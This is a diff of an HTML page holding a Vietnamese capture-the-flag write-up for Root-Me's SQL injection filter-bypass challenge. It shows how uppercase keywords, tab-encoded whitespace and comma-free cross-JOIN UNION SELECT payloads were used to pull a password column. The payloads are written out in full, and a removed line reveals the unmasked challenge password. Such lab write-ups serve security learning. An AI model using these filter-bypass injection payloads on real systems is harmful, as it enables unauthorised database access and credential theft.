@@ -170,49 +170,48 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
-<p><strong>Challenge:</strong> S<a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass">QL Injection – Filter bypass</a></p>
-<p>Challenge này có cấu trúc tương tự các bài SQL đã làm, tab Membres có câu query <strong>id=1</strong> và chỉ có ở đây có thể tiêm payload vào. Tuy vậy, đời không như là mơ, ta bị reject:</p>
-<img src="./media/image1.png" style="width:6.5in;height:1.75347in" alt="Graphical user interface, text, application Description automatically generated" />
+                        <h1 id="sql-injection--filter-bypass"><a class="header" href="#sql-injection--filter-bypass">S<a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass">QL Injection – Filter bypass</a></a></h1>
+<p>Challenge này có cấu trúc tương tự các bài SQL đã làm, tab Membres có câu query <code>id=1</code> và chỉ có ở đây có thể tiêm payload vào. Tuy vậy, đời không như là mơ, ta bị reject:</p>
+<p><img src="./media/image1.png" alt="" /></p>
 <p>Mở burpsuite lên và thử fuzz tìm filter của nó thôi!</p>
 <p>Với comment của tác giả, ta đã xác định được database gồm 4 cột:</p>
-<img src="./media/image2.png" style="width:6.5in;height:3.55208in" alt="Graphical user interface, text, application, email Description automatically generated" />
+<p><img src="./media/image2.png" alt="" /></p>
 <p>Sau 20 phút ngồi fuzz không thành, thôi thì bỏ vào intruder để brute thử:</p>
-<img src="./media/image3.png" style="width:6.87538in;height:5.40932in" alt="Graphical user interface, application, PowerPoint Description automatically generated" />
+<p><img src="./media/image3.png" alt="" /></p>
 <p>Có vẻ là server đã chặn hết các từ khóa luôn. Stuck tiếp 1 tiếng. Thử test lại với uppercase các keyword thì thấy qua được filter:</p>
-<img src="./media/image4.png" style="width:5.64226in;height:2.31821in" alt="Graphical user interface, text, application Description automatically generated" />
+<p><img src="./media/image4.png" alt="" /></p>
 <ul>
 <li>Uppercase các keyword</li>
 </ul>
-<p>Đời không như là mơ, đến lúc này, server filter hết các ký tự “+”, “%20” và “whitespace”:</p>
-<img src="./media/image5.png" style="width:5.52531in;height:2.2544in" alt="Graphical user interface, text, application Description automatically generated" />
-<p>Stackoverflow bảo hãy thử các ký tự <strong>/**/ %00 %09 %0a %0d</strong> để bypass. Thì thấy %00 bypass được:</p>
-<img src="./media/image6.png" style="width:5.58931in;height:2.31156in" alt="Graphical user interface, text Description automatically generated" />
-<p>Tuy nhiên, tiếp tục fuzz với %00 thì vẫn không có kết quả gì trả về:</p>
-<img src="./media/image7.png" style="width:6.5in;height:2.69792in" alt="Graphical user interface, text, application, email Description automatically generated" />
-<p>Quay ngược lại thử %09 (vì lúc thử đến %00 bypass được nên không thử nữa) thì thấy cũng bypass được. Tra trên URL Encoding thì biết đây là ký tự Tab:</p>
-<img src="./media/image8.png" style="width:6.5in;height:2.75in" alt="Graphical user interface, text, email Description automatically generated" />
-<p>Ngồi fuzz và ta đã có payload có thể tiêm:</p>
-<p><strong>1%09UNION%09SELECT%09*%09FROM%09membres%09LIMIT%091%09OFFSET%090</strong></p>
+<p>Đời không như là mơ, đến lúc này, server filter hết các ký tự <strong>“+”</strong>, <strong>“%20”</strong> và <strong>“whitespace”</strong>:</p>
+<p><img src="./media/image5.png" alt="" /></p>
+<p>Stackoverflow bảo hãy thử các ký tự <strong>/</strong>/ %00 %09 %0a %0d** để bypass. Thì thấy <code>%00</code> bypass được:</p>
+<p><img src="./media/image6.png" alt="" /></p>
+<p>Tuy nhiên, tiếp tục fuzz với <code>%00</code> thì vẫn không có kết quả gì trả về:</p>
+<p><img src="./media/image7.png" alt="" /></p>
+<p>Quay ngược lại thử %09 (vì lúc thử đến <code>%00</code> bypass được nên không thử nữa) thì thấy cũng bypass được. Tra trên URL Encoding thì biết đây là ký tự Tab:</p>
+<p><img src="./media/image8.png" alt="" /></p>
+<p>Ngồi fuzz và ta đã có payload có thể tiêm:
+<code>1%09UNION%09SELECT%09*%09FROM%09membres%09LIMIT%091%09OFFSET%090</code></p>
 <p>Ở trên, ta đã biết được 4 cột của database. Giờ thì thử thách tiếp theo là bypass dấu <strong>‘,’</strong>. Tuy nhiên, có vẻ như không có cách nào thay thế được dấu ‘,’ cả.</p>
-<p>Sau khi lượn trên các mặt trận, em tìm được cấu trúc query sử dụng cross join để JOIN multi query trong subqueries để có thể truy xuất nhiều cột không cần sử dụng <strong>‘comma’</strong>:</p>
-<blockquote>
-<p>union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);</p>
-</blockquote>
-<img src="./media/image9.png" style="width:6.00411in;height:2.99885in" alt="Graphical user interface, text, application, email Description automatically generated" />
-<p>Thử áp dụng payload trên và các lưu ý từ đầu, ta có payload:</p>
-<p>1 UNION SELECT * FROM (SELECT 123) AS a JOIN (SELECT 456) AS b JOIN (SELECT 123) AS c JOIN (SELECT pass FROM membres LIMIT 1) AS d) LIMIT 1 OFFSET 0</p>
-<p>Payload để tiêm:</p>
-<p><strong>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%090</strong></p>
-<img src="./media/image10.png" style="width:6.5in;height:1.97431in" alt="Graphical user interface, text, application, email Description automatically generated" />
-<p>Không hiểu sao nó chỉ trả về giá trị như lúc đầu tiêm. Ngồi stuck một hồi nữa và thử đổi payload thì mới phát hiện ra quên thay đổi OFFSET từ 0 1 vì mình đã query id=1. Thay đổi payload:</p>
-<p><strong>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%091</strong></p>
-<img src="./media/image11.png" style="width:6.5in;height:2.62778in" alt="Graphical user interface, text, application, email Description automatically generated" />
+<p>Sau khi lượn trên các mặt trận, em tìm được cấu trúc query sử dụng cross join để JOIN multi query trong subqueries để có thể truy xuất nhiều cột không cần sử dụng <strong>‘comma’</strong>:
+<code>union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);</code></p>
+<p><img src="./media/image9.png" alt="" /></p>
+<p>Thử áp dụng payload trên và các lưu ý từ đầu, ta có payload:
+<code>1 UNION SELECT * FROM (SELECT 123) AS a JOIN (SELECT 456) AS b JOIN (SELECT 123) AS c JOIN (SELECT pass FROM membres LIMIT 1) AS d) LIMIT 1 OFFSET 0</code></p>
+<p>Payload để tiêm:
+<code>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%090</code></p>
+<p><img src="./media/image10.png" alt="" /></p>
+<p>Không hiểu sao nó chỉ trả về giá trị như lúc đầu tiêm. Ngồi stuck một hồi nữa và thử đổi payload thì mới phát hiện ra quên thay đổi OFFSET từ 0 1 vì mình đã query id=1. Thay đổi payload:
+<code>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%091</code></p>
+<p><img src="./media/image11.png" alt="" /></p>
 <ul>
-<li>Tìm được password: <strong>KLfgyTIJbdhursqli</strong></li>
+<li>Tìm được password: <strong>KLfgy</strong>**************<strong>sqli</strong></li>
 </ul>
-<img src="./media/image12.png" style="width:6.5in;height:3.525in" alt="A screenshot of a computer Description automatically generated" />
-<p>- Flag: ************************</p>
+<p><img src="./media/image12.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
 
                     </main>
 
